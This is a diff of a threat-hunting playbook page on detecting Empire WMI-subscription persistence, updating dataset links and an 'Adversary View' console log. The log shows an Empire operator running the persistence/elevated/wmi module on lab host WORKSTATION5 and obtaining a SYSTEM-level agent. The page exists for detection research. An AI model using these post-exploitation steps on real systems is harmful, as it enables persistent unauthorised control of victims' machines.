@@ -209,7 +209,7 @@
     <ul class="current">
      <li class="toctree-l3">
       <a class="reference internal" href="SDWIN-190319023812.html">
-       Empire Userland Registry
+       Empire Userland Registry Run Key
       </a>
      </li>
      <li class="toctree-l3">
@@ -244,6 +244,11 @@
      Privilege Escalation
     </a>
     <ul>
+     <li class="toctree-l3">
+      <a class="reference internal" href="../04_privilege_escalation/SDWIN-200904032946.html">
+       Empire UAC Shell API FodHelper
+      </a>
+     </li>
      <li class="toctree-l3">
       <a class="reference internal" href="../04_privilege_escalation/SDWIN-190518204300.html">
        Empire Invoke Runas
@@ -795,7 +800,7 @@
 <td class="text-align:left"><p>https://github.com/EmpireProject/Empire/blob/dev/data/module_source/persistence/Persistence.psm1</p></td>
 </tr>
 <tr class="row-even"><td class="text-align:left"><p>Dataset</p></td>
-<td class="text-align:left"><p>https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/persistence/empire_elevated_wmi.tar.gz</p></td>
+<td class="text-align:left"><p>https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/persistence/empire_elevated_wmi_subscription.zip</p></td>
 </tr>
 <tr class="row-odd"><td class="text-align:left"><p>References</p></td>
 <td class="text-align:left"><p>None</p></td>
@@ -809,7 +814,19 @@
 </div>
 <div class="section" id="adversary-view">
 <h2>Adversary View<a class="headerlink" href="#adversary-view" title="Permalink to this headline">¶</a></h2>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>(Empire: TKV35P8X) &gt; usemodule persistence/elevated/wmi*
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>(Empire: powershell/privesc/bypassuac_fodhelper) &gt; agents
+[*] Active agents:
+
+Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
+----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
+28BNF7RH ps 172.18.39.5     WORKSTATION5      *THESHIRE\pgustavo      powershell         5392   5/0.0    2020-09-04 20:31:17  http            
+W2TBCPHU ps 172.18.39.5     WORKSTATION5      THESHIRE\pgustavo       powershell         5584   5/0.0    2020-09-04 20:42:01  http            
+13ZK6G7M ps 172.18.39.5     WORKSTATION5      *THESHIRE\pgustavo      powershell         5676   5/0.0    2020-09-04 20:41:59  http            
+
+
+(Empire: agents) &gt; interact 13ZK6G7M
+(Empire: 13ZK6G7M) &gt; 
+(Empire: 13ZK6G7M) &gt; usemodule persistence/elevated/wmi*
 (Empire: powershell/persistence/elevated/wmi) &gt; info
 
               Name: Invoke-WMI
@@ -824,6 +841,7 @@ MinLanguageVersion: 2
 Authors:
   @mattifestation
   @harmj0y
+  @jbooz1
 
 Description:
   Persist a stager (or script) using a permanent WMI
@@ -837,36 +855,65 @@ Options:
 
   Name        Required    Value                     Description
   ----        --------    -------                   -----------
+  Agent       True        13ZK6G7M                  Agent to run module on.                 
+  Listener    True        http                      Listener to use.                        
   DailyTime   False                                 Daily time to trigger the script        
                                                     (HH:mm).                                
-  ProxyCreds  False       default                   Proxy credentials                       
-                                                    ([domain\]username:password) to use for 
-                                                    request (default, none, or other).      
+  AtStartup   False       True                      Switch. Trigger script (within 5        
+                                                    minutes) of system startup.             
+  FailedLogon False                                 Trigger script with a failed logon      
+                                                    attempt from a specified user           
+  SubName     True        Updater                   Name to use for the event subscription. 
   ExtFile     False                                 Use an external file for the payload    
                                                     instead of a stager.                    
   Cleanup     False                                 Switch. Cleanup the trigger and any     
                                                     script from specified location.         
-  Agent       True        TKV35P8X                  Agent to run module on.                 
-  Listener    True                                  Listener to use.                        
-  SubName     True        Updater                   Name to use for the event subscription. 
-  Proxy       False       default                   Proxy to use for request (default, none,
-                                                    or other).                              
-  AtStartup   False       True                      Switch. Trigger script (within 5        
-                                                    minutes) of system startup.             
   UserAgent   False       default                   User-agent string to use for the staging
                                                     request (default, none, or other).      
-  FailedLogon False                                 Trigger script with a failed logon      
-                                                    attempt from a specified user           
+  Proxy       False       default                   Proxy to use for request (default, none,
+                                                    or other).                              
+  ProxyCreds  False       default                   Proxy credentials                       
+                                                    ([domain\]username:password) to use for 
+                                                    request (default, none, or other).      
 
-(Empire: powershell/persistence/elevated/wmi) &gt; set Listener https
 (Empire: powershell/persistence/elevated/wmi) &gt; execute
 [&gt;] Module is not opsec safe, run? [y/N] y
-[*] Tasked TKV35P8X to run TASK_CMD_WAIT
-[*] Agent TKV35P8X tasked with task ID 3
-[*] Tasked agent TKV35P8X to run module powershell/persistence/elevated/wmi
-(Empire: powershell/persistence/elevated/wmi) &gt; WMI persistence established using listener https with OnStartup WMI subsubscription trigger.
+[*] Tasked 13ZK6G7M to run TASK_CMD_WAIT
+[*] Agent 13ZK6G7M tasked with task ID 1
+[*] Tasked agent 13ZK6G7M to run module powershell/persistence/elevated/wmi
+(Empire: powershell/persistence/elevated/wmi) &gt; 
+WMI persistence established using listener http with OnStartup WMI subsubscription trigger.
 
-(Empire: powershell/persistence/elevated/wmi) &gt;
+(Empire: powershell/persistence/elevated/wmi) &gt; 
+(Empire: powershell/persistence/elevated/wmi) &gt; 
+[*] Sending POWERSHELL stager (stage 1) to 172.18.39.5
+[*] New agent PYA28EDF checked in
+[+] Initial agent PYA28EDF from 172.18.39.5 now active (Slack)
+[*] Sending agent (stage 2) to PYA28EDF at 172.18.39.5
+
+(Empire: powershell/persistence/elevated/wmi) &gt; 
+(Empire: powershell/persistence/elevated/wmi) &gt; agents
+
+[*] Active agents:
+
+Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
+----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
+28BNF7RH ps 172.18.39.5     WORKSTATION5      *THESHIRE\pgustavo      powershell         5392   5/0.0    2020-09-04 20:31:17  http            
+W2TBCPHU ps 172.18.39.5     WORKSTATION5      THESHIRE\pgustavo       powershell         5584   5/0.0    2020-09-04 20:43:48  http            
+13ZK6G7M ps 172.18.39.5     WORKSTATION5      *THESHIRE\pgustavo      powershell         5676   5/0.0    2020-09-04 20:43:48  http            
+
+PYA28EDF ps 172.18.39.5     WORKSTATION5      *THESHIRE\SYSTEM        powershell         7480   5/0.0    2020-09-04 20:49:29  http            
+
+(Empire: agents) &gt; interact PYA28EDF
+(Empire: PYA28EDF) &gt; shell whoami
+[*] Tasked PYA28EDF to run TASK_SHELL
+[*] Agent PYA28EDF tasked with task ID 1
+(Empire: PYA28EDF) &gt; 
+nt authority\system
+..Command execution completed.
+
+(Empire: PYA28EDF) &gt; 
+(Empire: PYA28EDF) &gt;
 </pre></div>
 </div>
 </div>
@@ -887,7 +934,7 @@ Options:
 <h3>Download &amp; Process Mordor File<a class="headerlink" href="#download-process-mordor-file" title="Permalink to this headline">¶</a></h3>
 <div class="cell docutils container">
 <div class="cell_input docutils container">
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">mordor_file</span> <span class="o">=</span> <span class="s2">&quot;https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/persistence/empire_elevated_wmi.tar.gz&quot;</span>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">mordor_file</span> <span class="o">=</span> <span class="s2">&quot;https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/persistence/empire_elevated_wmi_subscription.zip&quot;</span>
 <span class="n">registerMordorSQLTable</span><span class="p">(</span><span class="n">spark</span><span class="p">,</span> <span class="n">mordor_file</span><span class="p">,</span> <span class="s2">&quot;mordorTable&quot;</span><span class="p">)</span>
 </pre></div>
 </div>
